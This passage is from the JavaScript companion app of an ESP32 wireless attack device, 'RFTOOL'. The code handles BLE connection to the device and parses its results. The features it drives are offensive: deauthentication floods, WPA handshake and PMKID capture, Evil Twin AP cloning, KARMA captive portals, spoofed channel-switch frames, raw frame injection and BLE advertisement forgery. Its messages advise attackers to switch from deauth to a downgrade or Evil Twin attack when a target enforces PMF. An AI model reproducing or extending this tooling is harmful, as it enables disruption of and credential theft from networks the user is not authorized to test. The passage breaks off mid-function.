                parsed = svcs.map(svc => {
                    const uuid = (svc.uuid || '').toLowerCase();
                    const chars = (svc.characteristics || []).map(c => ({
                        uuid: (c.uuid || c.characteristic || '').toLowerCase(),
                        props: parseProps(c.properties || {})
                    })).filter(c => c.uuid);
                    return { uuid, chars, isStd: isStdSvc(uuid) };
                });

                /* 打印所有服务详情 */
                for (const s of parsed){
                    dlog('服务 ' + s.uuid + (s.isStd ? ' [标准]' : ' [自定义]') +
                         ' 特征数=' + s.chars.length +
                         ' 详情: ' + s.chars.map(c => c.uuid + JSON.stringify(c.props)).join(' | '));
                }

                /* 第一轮: 精确 UUID 匹配 (NUS) */
                for (const s of parsed){
                    for (const [svcKnown, rxKnown, txKnown] of [[SVC_UUID,RX_UUID,TX_UUID]]){
                        if (s.uuid === svcKnown.toLowerCase()){
                            const rxCh = s.chars.find(c => c.uuid === rxKnown.toLowerCase());
                            const txCh = s.chars.find(c => c.uuid === txKnown.toLowerCase());
                            if (rxCh && txCh){
                                actualSvc = s.uuid; actualRx = rxCh.uuid; actualTx = txCh.uuid;
                                found = true;
                                log('UUID 精确匹配: svc=' + s.uuid.slice(0,8), 'ok');
                                break;
                            }
                            dlog('服务 UUID 匹配但特征不匹配: rx=' + (rxCh?'Y':'N') + ' tx=' + (txCh?'Y':'N'));
                        }
                    }
                    if (found) break;
                }

                /* 第二轮: 仅在自定义服务中按属性匹配 (WRITE + NOTIFY) */
                if (!found){
                    for (const s of parsed){
                        if (s.isStd) continue;  /* 跳过标准服务 */
                        const wr = s.chars.find(c => hasProp(c.props,['write','writewithoutresponse']));
                        const nt = s.chars.find(c => hasProp(c.props,['notify','indicate']));
                        if (wr && nt){
                            actualSvc = s.uuid; actualRx = wr.uuid; actualTx = nt.uuid;
                            found = true;
                            log('按属性匹配: svc=' + s.uuid.slice(0,8) + ' rx=' + wr.uuid.slice(0,8) + ' tx=' + nt.uuid.slice(0,8), 'ok');
                            break;
                        }
                    }
                }
            } catch(e){
                dlog('getServices 异常: ' + e.message);
            }

            if (!found){
                log('可用服务: ' + JSON.stringify(parsed.map(s => s.uuid)).slice(0,400), 'warn');
                throw new Error('未找到 RFTOOL 服务, 请确认设备固件正确');
            }

            /* 握手等待器: 复用模块级 handshakeResolve (由 handleNusMessage 触发) */
            const handshakePromise = new Promise((res) => { handshakeResolve = res; });

            const notifKey = 'notification|' + capDeviceId + '|' + actualSvc.toLowerCase() + '|' + actualTx.toLowerCase();
            dlog('注册通知监听 key=' + notifKey);
            notifyListener = await capBle.addListener(notifKey, (event) => {
                const val = event.value;
                let bytes;
                if (typeof val === 'string'){
                    bytes = new Uint8Array(val.trim().split(/\s+/).map(s => parseInt(s,16)));
                } else if (val instanceof DataView){
                    bytes = new Uint8Array(val.buffer, val.byteOffset, val.byteLength);
                } else if (val instanceof ArrayBuffer){
                    bytes = new Uint8Array(val);
                } else if (val && val.buffer){
                    bytes = new Uint8Array(val.buffer);
                } else {
                    bytes = new Uint8Array(val || []);
                }
                if (devMode) dlog('[NUS] 收到 ' + bytes.length + 'B');
                nusFeed(bytes);
            });
            await capBle.startNotifications({ deviceId: capDeviceId, service: actualSvc, characteristic: actualTx });
            dlog('通知已启用');

            /* 握手验证: 发送 version 命令 (NUS 帧), 等待设备响应确认身份 */
            log('握手验证中...', 'warn');
            try {
                await nusWrite('version');
                dlog('已发送 version 握手命令 (NUS 帧)');
            } catch(e){
                dlog('握手发送失败: ' + e.message);
            }

            const handshakeResp = await Promise.race([
                handshakePromise,
                new Promise((_, rej) => setTimeout(() => rej(new Error('握手超时(3s)')), 3000))
            ]);
            handshakeResolve = null;
            /* 提取固件版本 (形如 "RFTOOL-C5 v1.0") */
            const vm = handshakeResp.match(/v?(\d+\.\d+(?:\.\d+)?)/i);
            fwVersion = vm ? vm[1] : handshakeResp.trim().slice(0, 16);
            applyVersionUI();
            reconnectAttempts = 0;   /* 连接成功, 重置退避 */
            updateConnInfo();
            log('握手成功: ' + handshakeResp.replace(/\n/g,' ').slice(0,60), 'ok');
            dlog('握手响应: ' + handshakeResp.replace(/\n/g,'\\n'));

            setConnected(true, d.name);
            autoReconnect = true;
            log('通道就绪 (svc=' + actualSvc.slice(0,8) + ' rx=' + actualRx.slice(0,8) + ' tx=' + actualTx.slice(0,8) + ')', 'ok');
            toast('已连接 ' + (d.name || ''), 'ok');
            dlog('发送初始命令: status');
            sendCmd('status');
        } else {
            const device = d.device || d;
            log('连接中: ' + (device.name || device.id) + ' ...', 'warn');
            device.addEventListener('gattserverdisconnected', onDisconnect);
            bleServer = await Promise.race([ device.gatt.connect(), timeout ]);
            log('GATT 已连接, 发现服务...', 'ok');

            try { if (bleServer.requestMtu) await bleServer.requestMtu(512); } catch(e){}

            /* 动态发现服务 (NUS) */
            const services = await bleServer.getPrimaryServices();
            let found = false;
            for (const svc of services){
                const svcUuid = svc.uuid.toLowerCase();
                if (svcUuid === SVC_UUID){
                    const chars = await svc.getCharacteristics();
                    for (const ch of chars){
                        const cu = ch.uuid.toLowerCase();
                        if (cu === RX_UUID) rxChar = ch;
                        if (cu === TX_UUID){
                            txChar = ch;
                            actualSvc = svcUuid;
                            actualTx = cu;
                            actualRx = rxChar ? rxChar.uuid.toLowerCase() : RX_UUID;
                            found = true;
                        }
                    }
                    if (found) break;
                }
            }
            if (!found){
                const svcList = services.map(s => s.uuid.slice(0,8)).join(', ');
                log('可用服务: ' + svcList, 'warn');
                throw new Error('未找到 NUS 服务, 请确认设备固件正确');
            }

            txChar.addEventListener('characteristicvaluechanged', e => {
                nusFeed(new Uint8Array(e.target.value.buffer, e.target.value.byteOffset, e.target.value.byteLength));
            });
            await txChar.startNotifications();
            /* Web 端也做一次握手确认 */
            const hsPromise = new Promise((res) => { handshakeResolve = res; });
            try { await nusWrite('version'); } catch(e){ dlog('握手发送失败: ' + e.message); }
            const hsResp = await Promise.race([
                hsPromise,
                new Promise((_, rej) => setTimeout(() => rej(new Error('握手超时(3s)')), 3000))
            ]);
            handshakeResolve = null;
            const wvm = hsResp.match(/v?(\d+\.\d+(?:\.\d+)?)/i);
            fwVersion = wvm ? wvm[1] : hsResp.trim().slice(0, 16);
            applyVersionUI();
            reconnectAttempts = 0;
            updateConnInfo();
            setConnected(true, device.name);
            autoReconnect = true;
            log('通道就绪 (NUS) · 固件 ' + fwVersion, 'ok');
            toast('已连接 ' + (device.name || ''), 'ok');
            sendCmd('status');
        }
    } catch(e){
        log('连接失败: ' + e.message, 'err');
        toast('连接失败: ' + e.message, 'err');
        setConnected(false);
        await removeNotifyListener();
        /* 握手失败时主动断开, 避免残留连接 */
        if (useCapacitorBle && capDeviceId){
            try { const cb = getCapBle(); await cb.disconnect({ deviceId: capDeviceId }); } catch(_){}
        }
        /* 连接失败时自动开启开发者模式, 方便排查 */
        if (!devMode){
            setDevMode(true);
            log('提示: 已自动开启调试模式, 请重试连接以获取详细日志', 'warn');
        }
    } finally {
        connecting = false;
        setConnecting(false);
    }
}

/*
   断线处理 + 自动重连
 */
/* 移除通知监听 (Capacitor 路径需要手动 remove) */
async function removeNotifyListener(){
    if (notifyListener){
        try { await notifyListener.remove(); dlog('[断开] 通知监听已移除'); } catch(e){ dlog('移除监听失败: ' + e.message); }
        notifyListener = null;
    }
    if (disconnectListener){
        try { await disconnectListener.remove(); } catch(e){}
        disconnectListener = null;
    }
}

function onDisconnect(){
    log('BLE 已断开', 'warn');
    dlog('[断开] 连接断开, autoReconnect=' + autoReconnect + ' lastDevice=' + (lastDevice?'Y':'N'));
    setConnected(false);
    bleDevice = null; bleServer = null; rxChar = null; txChar = null;
    removeNotifyListener();
    setJobActive(false);
    if (autoReconnect && lastDevice){
        reconnectAttempts++;
        /* 指数退避 + ±20% 抖动, 避免与其它重连风暴共振 */
        const base = Math.min(RECONNECT_BASE * Math.pow(2, reconnectAttempts - 1), RECONNECT_MAX);
        const jitter = base * 0.2 * (Math.random() * 2 - 1);
        const wait = Math.max(500, Math.round(base + jitter));
        toast('连接断开, ' + (wait/1000).toFixed(1) + 's 后重连 (第 ' + reconnectAttempts + ' 次)', 'warn');
        log('自动重连: 第 ' + reconnectAttempts + ' 次, ' + (wait/1000).toFixed(1) + 's 后', 'warn');
        reconnectTimer = setTimeout(() => {
            if (autoReconnect && lastDevice) connectToDevice(lastDevice);
        }, wait);
    }
}

/* 手动断开 */
$('btnDisconnect').addEventListener('click', async () => {
    dlog('[断开] 用户手动断开');
    autoReconnect = false;
    reconnectAttempts = 0;
    clearTimeout(reconnectTimer);
    await removeNotifyListener();
    if (useCapacitorBle){
        const capBle = getCapBle();
        try { await capBle.disconnect({ deviceId: capDeviceId }); dlog('capBle.disconnect 成功'); }
        catch(e){ dlog('capBle.disconnect 失败: ' + e.message); }
        capDeviceId = null;
    } else if (bleDevice && bleDevice.gatt && bleDevice.gatt.connected){
        bleDevice.gatt.disconnect();
    }
    setConnected(false);
    log('已断开连接', 'warn');
    toast('已断开', 'warn');
});

$('btnScan').addEventListener('click', startBleScan);

/* 系统选择器: 直接调用原生 BLE 设备选择对话框, 比后台扫描更可靠 */
$('btnPicker').addEventListener('click', async () => {
    if (connecting) return;
    stopBleScan();
    const capBle = getCapBle();
    try {
        if (capBle){
            useCapacitorBle = true;
            await capBle.initialize();
            const device = await capBle.requestDevice({});
            if (device && device.deviceId){
                connectToDevice({ deviceId: device.deviceId, name: device.name });
            }
        } else if (navigator.bluetooth){
            useCapacitorBle = false;
            const device = await navigator.bluetooth.requestDevice({
                acceptAllDevices: true, optionalServices: [SVC_UUID]
            });
            connectToDevice({ device });
        }
    } catch(e){
        log('选择设备失败: ' + e.message, 'err');
        toast('选择设备失败', 'err');
    }
});

/*
   接收数据
 */
let rxBuffer = '';
function handleNotifyData(chunk){
    rxBuffer += chunk;
    let idx;
    while ((idx = rxBuffer.indexOf('\n')) >= 0){
        const line = rxBuffer.slice(0, idx).replace(/\r$/, '');
        rxBuffer = rxBuffer.slice(idx + 1);
        if (line) parseOutputLine(line);
    }
}

/*
   解析输出行
   固件协议 (radio_common.h):
     META,WIFI,<key>,<value>[,<key>,<value>...]   状态行
     AP,<bssid>,<ssid>,<ch>,<rssi>,<enc>,<hidden>,...   数据行
     CLIENT,<mac>,<bssid>,<rssi>,<pkts>,<vendor>
 */

/* 功能启动确认 (发送命令后等待设备回执) */
let pendingAction = null;
function expectConfirm(label, timeoutMs=5000){
    clearPendingAction();
    pendingAction = {
        label,
        t0: Date.now(),
        timer: setTimeout(() => {
            const la = pendingAction && pendingAction.label;
            pendingAction = null;
            log('[' + la + '] 设备无响应 (超时 ' + Math.round(timeoutMs/1000) + 's)', 'err');
            toast(la + ' 无响应', 'err');
        }, timeoutMs)
    };
}
function confirmAction(msg){
    if (!pendingAction) return;
    clearTimeout(pendingAction.timer);
    /* 带上往返耗时, 便于判断链路是否健康 */
    const ms = Date.now() - (pendingAction.t0 || Date.now());
    const cost = ms >= 1000 ? (ms / 1000).toFixed(1) + 's' : ms + 'ms';
    log('[' + pendingAction.label + '] ' + msg + ' · ' + cost, 'ok');
    toast(pendingAction.label + ' OK · ' + cost, 'ok');
    pendingAction = null;
}
function clearPendingAction(){
    if (pendingAction){ clearTimeout(pendingAction.timer); pendingAction = null; }
}

/* 固件拒绝原因 (META 里的 msg 字段是稳定机器码) -> 能直接照着做的话.
 * 表里没有的码原样显示, 不做兜底猜测: 猜错比不猜更误导. */
const REFUSE_TEXT = {
    need_confirm:       '设备要确认, 命令没带 --yes',
    arg_parse_failed:   '参数格式不对',
    bad_option:         '参数格式不对',
    unknown_command:    '设备不认识这条命令',
    bad_bssid:          'BSSID 格式不对',
    bad_station:        'STA MAC 格式不对',
    bad_channel:        '信道超出范围',
    bad_target:         '目标类型不存在',
    bad_format:         '格式只支持 csv / json',
    bad_subcmd:         '子命令不存在',
    need_ssid:          '缺 SSID',
    need_key:           '缺配置键名',
    need_url:           '缺 URL',
    need_size:          '缺大小',
    need_hex:           '缺十六进制帧',
    deauth_start_failed:   '注入任务起不来, 设备可能正忙',
    sniff_start_failed:    '嗅探起不来, 设备可能正忙',
    beacon_start_failed:   'Beacon 起不来, 设备可能正忙',
    probe_start_failed:    'Probe 起不来, 设备可能正忙',
    downgrade_start_failed:'降级 AP 起不来',
    http_start_failed:  '板载服务起不来',
    nothing_running:    '本来就没在跑',
    not_running:        '功能未运行',
    no_mem:             '设备内存不足',
    pmf_required:       '目标是 PMF 必需, 广播 deauth 无效',
    target_not_in_db:   '目标不在 AP 表里, 先扫描',
    ap_not_in_db:       '目标不在 AP 表里, 先扫描',
    ap_not_found:       '目标不在 AP 表里, 先扫描',
    ssid_hidden:        '目标隐藏了 SSID, 无法克隆',
    clone_failed:       '克隆没起来',
    ap_start_failed:    '热点起不来, 射频可能被占',
    confirm_failed:     '当前镜像确认失败',
    rollback_failed:    '回滚失败',
    rollback_disabled:  '这个固件没开回滚',
    download_failed:    '下载失败',
    validate_failed:    '镜像校验没过',
    begin_failed:       'OTA 没能开始',
    set_boot_failed:    '写启动分区失败',
    no_ota_partition:   '没有 OTA 分区',
    only_http_supported:'只支持 http 地址',
    http_init_failed:   'HTTP 客户端起不来',
    need_channel:       '目标不在库里, 要显式给信道',
    timeout:            '超时',
};

/* esp_err_t -> 人话. 只收 CLI 会原样返回的那几个: 处理函数多数把 esp_err
 * 折成 0/1, 剩下的裸 rc 就是 ESP-IDF 的 0x100 段. */
const ESP_ERR_TEXT = {
    0x101: '内存不足',
    0x102: '参数无效',
    0x103: '当前状态不允许',
    0x104: '尺寸不对',
    0x105: '找不到对象',
    0x106: '设备不支持',
    0x107: '超时',
    0x108: '响应无效',
    1:     '执行失败',
    '-1':  '执行失败',
};

/* 设备明确拒绝一次操作: 先掐等待回执的计时器, 再报原因.
 * 只写日志不清计时器, 8 秒后照样弹"设备无响应", 把一条明确的拒绝
 * 说成链路故障, 排查方向从第一步就错了.
 * 固件常把说明直接写进 msg 字段 ("ap_not_found (先 scan/sniff...)"),
 * 所以按第一个空格切出机器码查表, 后半段原样留作细节. */
function reportRefusal(code, detail, fallbackLabel){
    const label = (pendingAction && pendingAction.label) || fallbackLabel || '命令';
    clearPendingAction();
    clearHandshake();
    const raw = String(code || '');
    const key = raw.split(' ')[0];
    const why = REFUSE_TEXT[key] || raw || '未知原因';
    const d = [detail, raw.slice(key.length).trim()].filter(Boolean).join(' · ');
    log('[' + label + '] 拒绝: ' + why + (d ? ' · ' + d : ''), 'err');
    toast(label + ' 未执行: ' + why, 'err');
}

/* Deauth 的结果判定
 *
 * 帧发出去只是手段, 不是结果: done 行只说明"板子把帧打出去了", 并不知道
 * 客户端有没有掉线、有没有重连. 对面若是强制 PMF, 帧照样发得出去,
 * 旧逻辑却按 sent==frames 报成功, 这个成功是假的.
 *
 * 所以唯一硬指标是"有没有抓到完整握手": 收到匹配目标的 EAPOL 才算成功,
 * 否则一律降级为"已发出, 等待确认", 超时再提示换路线. */
const HS_WAIT_MS = 15000;
let pendingHs = null;

function expectHandshake(bssid, sent, onTimeout){
    clearHandshake();
    pendingHs = {
        bssid: (bssid || '').toLowerCase(),
        sent: sent,
        t0: Date.now(),
        timer: setTimeout(() => {
            const b = pendingHs && pendingHs.bssid;
            const n = pendingHs && pendingHs.sent;
            pendingHs = null;
            log('[Deauth] 已发出 ' + (n || '?') + ' 帧, 但 ' + (HS_WAIT_MS/1000) +
                's 内没抓到 ' + (b || '目标') + ' 的握手', 'warn');
            toast('未拿到握手 — 目标可能受保护(PMF), 建议改走降级 / Evil Twin', 'warn');
            if (onTimeout) onTimeout();
        }, HS_WAIT_MS)
    };
}
function clearHandshake(){
    if (pendingHs){ clearTimeout(pendingHs.timer); pendingHs = null; }
}

/* 批量设置同值元素 */
function setText(ids, val){
    for (const id of ids){ const el = $(id); if (el) el.textContent = val; }
}

/* 几类 META 行原来把逗号换成点直接糊上去, "PMF · REPORT · bssid · xx" 看不出
 * 结论. 按固件的字段顺序翻译成人话. */
function kvOf(p, from){
    const kv = {};
    for (let i = from; i + 1 < p.length; i += 2) kv[p[i]] = p[i+1];
    return kv;
}

function scenarioText(p){
    const k = p[2];
    /* PMF / SURVEY / HANDSHAKE 的 p[3] 是阶段名 (REPORT/START/DONE...), 不是
     * 字段名; DONE / STOP / STATUS 的 p[3] 直接就是字段名. */
    const phased = (k === 'PMF' || k === 'SURVEY' || k === 'HANDSHAKE');
    const kv = kvOf(p, phased ? 4 : 3);
    if (k === 'PMF'){
        if (p[3] === 'REPORT')
            return 'PMF: ' + (kv.mfpr === '1' ? '必需' : '未强制') +
                   ' · 能力 ' + (kv.mfpc === '1' ? '支持' : '不支持') +
                   ' · AKM ' + (kv.akm || '?') + ' · CH ' + (kv.channel || '?');
        if (p[3] === 'VERDICT')
            return kv.deauth_useless === '1'
                ? '结论: 广播 Deauth 无效, 改走 ' + (kv.next || '降级 / Evil Twin')
                : '结论: 可以 Deauth, 下一步 ' + (kv.next || '');
        if (p[3] === 'ERR') return 'PMF 判定失败: ' + (kv.msg || '?');
    }
    if (k === 'SURVEY'){
        if (p[3] === 'START') return '勘察开始 · ' + (kv.secs || '?') + 's';
        if (p[3] === 'DONE')
            return '勘察完成 · AP ' + (kv.aps || 0) + ' (新 ' + (kv.new_aps || 0) + ')' +
                   ' · 客户端 ' + (kv.clients || 0) + ' (新 ' + (kv.new_clients || 0) + ')' +
                   ' · 握手 ' + (kv.eapols || 0);
    }
    if (k === 'HANDSHAKE'){
        if (p[3] === 'START')
            return '抓握手 第 1 轮 · CH ' + (kv.channel || '?') +
                   ' · PMF ' + (kv.pmf === '1' ? '必需' : '无');
        if (p[3] === 'BLOCKED') return '目标强制 PMF, 这条路走不通';
        if (p[3] === 'DONE')
            return '抓握手结束 · ' + (kv.rounds || 0) + ' 轮 · 可用 ' +
                   (kv.hs_complete || 0) + ' / 共 ' + (kv.hs_total || 0) +
                   ' · PMKID ' + (kv.pmkid || 0);
    }
    if (k === 'DONE')   return '编排结束 (' + (kv.kind || '') + ')';
    if (k === 'STOP')   return '编排已停止 (' + (kv.kind || '') + ')';
    if (k === 'STATUS')
        return kv.running === '1'
            ? '编排中 · ' + (kv.kind || '') + ' / ' + (kv.phase || '') + ' · 第 ' + (kv.rounds || 0) + ' 轮'
            : '编排空闲';
    return p.slice(2).join(' · ');
}

function locateText(p){
    const k = p[2];
    const kv = kvOf(p, 3);
    if (k === 'T')
        return 'rssi ' + (kv.rssi || '?') + ' · 均 ' + (kv.avg || '?') +
               ' · 区间 ' + (kv.min || '?') + '~' + (kv.max || '?') +
               ' · n ' + (kv.n || 0) + ' · ' + (kv.trend || '');
    if (k === 'START') return '采样开始 · ' + (kv.kind === 'client' ? '客户端' : 'AP') +
                              ' · ' + (kv.secs || '?') + 's';
    if (k === 'DONE')  return '采样完成 · ' + (kv.samples || 0) + ' 个 · 均值 ' +
                              (kv.avg || '?') + ' · 丢失 ' + (kv.miss || 0);
    if (k === 'STOP')  return '采样已停止';
    if (k === 'ERR')   return '失败: ' + (kv.msg || '?');
    return p.slice(2).join(' · ');
}

function otaText(p){
    const k = p[2];
    if (k === 'STATUS'){
        const kv = kvOf(p, 3);
        const mb = (parseInt(kv.slot_size || '0') || 0) / 1048576;
        return '运行槽 ' + (kv.running || '?') + ' · 启动槽 ' + (kv.boot || '?') +
               ' · ' + (kv.state || '?') + ' · v' + (kv.version || '?') +
               ' · 回滚' + (kv.rollback_enabled === '1' ? '开' : '关') +
               ' · 槽 ' + mb.toFixed(1) + 'MB';
    }
    if (k === 'ERR') return '失败: ' + (refuseText(p[3] === 'msg' ? p[4] : p[3]));
    const kv = kvOf(p, k === 'URL' ? 4 : 3);
    if (k === 'UPLOAD' && p[3] === 'DONE') return '上传完成 · ' + fmtBytes(parseInt(kv.bytes || '0'));
    if (k === 'URL'){
        if (p[3] === 'START') return '从 URL 升级到 ' + (kv.slot || '?') + ': ' + (kv.url || '');
        if (p[3] === 'DONE')  return '下载完成 ' + fmtBytes(parseInt(kv.bytes || '0')) + ' · 重启生效';
    }
    if (k === 'CONFIRM') return kv.ok === '1' ? '已确认当前镜像, 取消回滚' : '回滚未启用';
    if (k === 'ROLLBACK') return '正在回滚并重启';
    return p.slice(2).join(' · ');
}

/* 机器码 -> 人话, 表里没有就原样返回 */
function refuseText(code){
    const raw = String(code || '');
    const key = raw.split(' ')[0];
    return REFUSE_TEXT[key] || raw || '未知原因';
}

function parseOutputLine(line){
    /* 去掉设备回显的 "rftool> " 提示符 */
    const raw = line.replace(/^\s*rftool>\s*/i, '').trim();
    if (!raw) return;
    line = raw;

    /* 导出载荷采集: start 与 done 之间的非 META 行原样收进缓冲 */
    if (exportCap && !line.startsWith('META,')) exportCap.lines.push(line);

    /* 设备拒绝: 协议层错误与 PMF 拦截.
     * 这两类以前没有任何分支, 设备回了话 App 当普通日志滚过去, 调用方
     * 还在等回执, 8 秒后报"设备无响应"。设备明明说了原因却没人听. */
    if (line.startsWith('META,CLI,ERR,')){
        const p = line.split(',');
        const kv = {};
        for (let i = 3; i + 1 < p.length; i += 2) kv[p[i]] = p[i+1];
        reportRefusal(kv.msg, kv.detail, kv.cmd);
        return;
    }
    if (line.startsWith('META,CSA,TX,')){
        /* META,CSA,TX,ok,1,bssid,X,from,ch,to,ch,sent,N,fail,N,cloned,0|1 */
        const kv = kvOf(line.split(','), 3);
        log('[CSA] ' + kv.bssid + ' ch' + kv.from + ' → ch' + kv.to +
            ' · 发送 ' + (kv.sent || '0') + ' 帧' +
            (kv.cloned === '1' ? ' · 克隆真实 beacon' : ' · 合成帧'),
            kv.fail && kv.fail !== '0' ? 'warn' : 'ok');
        clearPendingAction();
        return;
    }

    if (line.startsWith('META,PMKID,ACTIVE,')){
        /* META,PMKID,ACTIVE,ok,1,bssid,X,ssid,Y,ch,N,m1,N,pmkid,N,ms,N */
        const p = line.split(',');
        const kv = {};
        for (let i = 3; i + 1 < p.length; i += 2) kv[p[i]] = p[i+1];
        clearPendingAction();
        if (kv.ok === '1'){
            log('[PMKID] ' + (kv.ssid || kv.bssid) + ' · M1 ' + (kv.m1 || '0') +
                ' · PMKID ' + (kv.pmkid || '0') + ' · ' + (kv.ms || '0') + 'ms',
                (kv.pmkid && kv.pmkid !== '0') ? 'ok' : 'warn');
            if (kv.pmkid && kv.pmkid !== '0') toast('拿到 PMKID: ' + kv.ssid, 'ok');
        } else {
            log('[PMKID] ' + (kv.ssid || '') + ' 失败: ' +
                (ESP_ERR_TEXT[kv.code] || ('code ' + (kv.code || '?'))), 'err');
            toast('PMKID 未拿到', 'warn');
        }
        return;
    }

    if (line.startsWith('META,WIFI,PMF,')){
        /* META,WIFI,PMF,<BLOCKED|UNKNOWN>,bssid,X,reason,Y,advice,Z */
        const p = line.split(',');
        const kv = {};
        for (let i = 4; i + 1 < p.length; i += 2) kv[p[i]] = p[i+1];
        reportRefusal(p[3] === 'BLOCKED' ? 'pmf_required' : 'target_not_in_db',
                      kv.advice, 'Deauth');
        return;
    }
    /* 命令收尾. rc 非 0 又没打 ERR 行的命令 (返回 esp_err 的处理函数就是
     * 这种), 以前全被这条 END 行带过, 调用方只能等到超时. 这里把它接住.
     * BEGIN/END 都是分帧标记, 平常不进日志: status 每 3 秒一条, 让它们
     * 滚屏会把真实输出冲掉. */
    if (line.startsWith('META,CLI,BEGIN,')) return;
    if (line.startsWith('META,CLI,END,')){
        const p = line.split(',');
        const kv = {};
        for (let i = 3; i + 1 < p.length; i += 2) kv[p[i]] = p[i+1];
        const rc = parseInt(kv.rc || '0');
        if (rc !== 0){
            /* 有等待回执就按等待者的话说, 没有就按命令名说. 后台轮询
             * (status) 失败不该弹窗, 但日志里必须留痕. */
            const had = !!pendingAction;
            const label = had ? pendingAction.label : (kv.cmd || '命令');
            const why = ESP_ERR_TEXT[rc] || ('rc=' + rc);
            clearPendingAction();
            log('[' + label + '] 命令失败: ' + why + ' (' + (kv.cmd || '?') + ' rc=' + rc + ')', 'err');
            if (had){
                clearHandshake();
                toast(label + ' 失败: ' + why, 'err');
            }
        }
        return;
    }

    /* 板载 HTTP 服务 (META,HTTP,) */
    if (line.startsWith('META,HTTP,')){
        const p = line.split(',');
        const sub = p[2];
        const kv = {};
        if (sub === 'START'){
            for (let i = 5; i < p.length - 1; i += 2) kv[p[i]] = p[i+1];
            if (kv.ip) boardIp = kv.ip;
            httpRunning = true;
            log('[板载] HTTP 服务已启动 · http://' + boardIp + '/', 'ok');
            toast('板载服务 ' + boardIp, 'ok');
        } else if (sub === 'STATUS'){
            for (let i = 3; i < p.length - 1; i += 2) kv[p[i]] = p[i+1];
            httpRunning = kv.running === '1';
            if (kv.ip) boardIp = kv.ip;
            log('[板载] ' + (httpRunning ? '运行中 · ' + boardIp : '未运行'), httpRunning ? 'ok' : 'warn');
        } else {
            httpRunning = false;
            log('[板载] HTTP 服务已停止', 'warn');
        }
        return;
    }

    /* 原始帧构造器 / KARMA / Evil Twin */
    if (line.startsWith('META,RAW,')){
        const p = line.split(',');
        const kv = {};
        for (let i = 3; i < p.length - 1; i += 2) kv[p[i]] = p[i+1];
        if (p[2] === 'TX' || p[2] === 'SEND'){
            const ok = kv.ok === '1';
            setText(['rawLast'], (ok ? 'OK · ' : '失败 · ') + (kv.len || '?') + ' 字节');
            log('[原始帧] ' + (ok ? '已发送 ' : '发送失败 ') + (kv.len || '?') + ' 字节' +
                (kv.err && kv.err !== 'ESP_OK' ? ' · ' + kv.err : ''), ok ? 'ok' : 'err');
            if (!ok) toast('注入失败: ' + (kv.err || ''), 'err');
        } else {
            log('[原始帧] ' + p.slice(3).join(','), 'err');
        }
        return;
    }
    if (line.startsWith('META,EVILTWIN,')){
        const p = line.split(',');
        const kv = {};
        for (let i = 3; i < p.length - 1; i += 2) kv[p[i]] = p[i+1];
        if (p[2] === 'CLONE'){
            log('[Evil Twin] 已克隆 ' + (kv.ssid || '') + ' · BSSID ' + (kv.bssid || '') +
                ' · CH' + (kv.chan || ''), 'ok');
            toast('克隆完成: ' + (kv.ssid || ''), 'ok');
            setText(['etHint'], '已克隆: ' + (kv.ssid || '') + ' · ' + (kv.bssid || '') +
                               ' · CH' + (kv.chan || '') + ' (开放认证)');
        } else if (p[2] === 'STOP'){
            log('[Evil Twin] 已停止', 'warn');
            setText(['etHint'], '未运行');
        } else if (p[2] === 'PUSH'){
            log('[Evil Twin] Deauth 推送结束', 'meta');
        } else {
            /* ERR: 要么带 msg 机器码, 要么带 code/err 名字 */
            reportRefusal(kv.msg || kv.err || 'clone_failed',
                          kv.code ? 'code ' + kv.code : '', '克隆');
        }
        return;
    }
    if (line.startsWith('META,KARMA,')){
        const p = line.split(',');
        if (p[2] === 'LIST'){ karmaList = []; karmaCount = parseInt(p[4] || '0'); renderKarma(); }
        else if (p[2] === 'CLEAR'){ karmaList = []; karmaCount = 0; renderKarma(); toast('已清空', 'warn'); }
        else if (p[2] === 'FOLLOW'){
            log('[KARMA] 门户已改名为 ' + (p[3] || '') + ' (命中 ' + (p[5] || '') + ' 次)', 'ok');
            toast('门户: ' + (p[3] || ''), 'ok');
        } else {
            log('[KARMA] ' + p.slice(3).join(','), 'warn');
        }
        return;
    }
    if (line.startsWith('KARMA,')){
        /* KARMA,<i>,<ssid>,hits,<n>,rssi,<n> */
        const p = line.split(',');
        karmaList.push({ i: parseInt(p[1] || '0'), ssid: p[2] || '',
                         hits: parseInt(p[4] || '0'), rssi: parseInt(p[6] || '0') });
        renderKarma();
        return;
    }

    if (line.startsWith('META,BLESCAN,')){
        const p = line.split(',');
        const kv = {};
        for (let i = 3; i < p.length - 1; i += 2) kv[p[i]] = p[i+1];
        if (p[2] === 'LIST'){
            renderBleDev();
            if (bleScanning){
                bleScanState('扫描中 · 已发现 ' + (kv.count || bleDevList.length) + ' 个');
            }
            log('[BLE] 共 ' + (kv.count || '0') + ' 台设备' + (kv.on === '1' ? ' · 扫描中' : ''), 'meta');
        } else if (p[2] === 'START'){
            if (kv.ok === '1'){
                bleScanning = true;
                radar('bleRadar2', true);
                bleScanState('扫描中…');
                confirmAction('已启动');
                log('[BLE] 开始扫描', 'meta');
                toast('BLE 扫描中', 'ok');
            } else {
                /* 关键诊断: 之前失败只显示 ok,0, 用户完全不知道原因 */
                clearPendingAction();
                bleScanning = false;
                stopBlePoll();
                radar('bleRadar2', false);
                const err = kv.err || '未知错误';
                bleScanState('启动失败 · ' + err);
                log('[BLE] 启动失败: ' + err, 'err');
                toast('BLE 启动失败: ' + err, 'err');
            }
        } else if (p[2] === 'STOP'){
            bleScanning = false;
            stopBlePoll();
            radar('bleRadar2', false);
            bleScanState(bleDevList.length ? ('完成 · ' + bleDevList.length + ' 个设备') : '已停止');
            renderBleDev();
            log('[BLE] 停止 · 共 ' + (kv.found || '0') + ' 台', 'meta');
        } else if (p[2] === 'CLEAR'){
            bleDevList = []; renderBleDev(); toast('已清空', 'warn');
        }
        return;
    }
    if (line.startsWith('BLEDEV,')){
        /* BLEDEV,<addr>,rssi,<v>,name,<名字里可能有逗号, 所以要拼回去> */
        const p = line.split(',');
        const addr = p[1] || '';
        const dev = {
            addr: addr,
            rssi: parseInt(p[3] || '0'),
            name: p.length > 5 ? p.slice(5).join(',') : ''
        };
        /* 去重: 多轮 blescan 会重复上报同一设备, 按地址合并更新 RSSI */
        const old = bleDevList.findIndex(d => d.addr === addr);
        if (old >= 0) bleDevList[old] = dev; else bleDevList.push(dev);
        renderBleDev();
        return;
    }

    /* 工具台: BLE 广播伪造 (META,BLE,ADV,<KIND>,k,v,...)
     * 注意协议里 ADV 后面紧跟的才是子命令 (START/STOP/STATUS/ERR),
     * 因此 kv 从 p[4] 开始取, 未知字段一律忽略. */
    if (line.startsWith('META,BLE,ADV,')){
        const p = line.split(',');
        const kind = p[3];
        const kv = {};
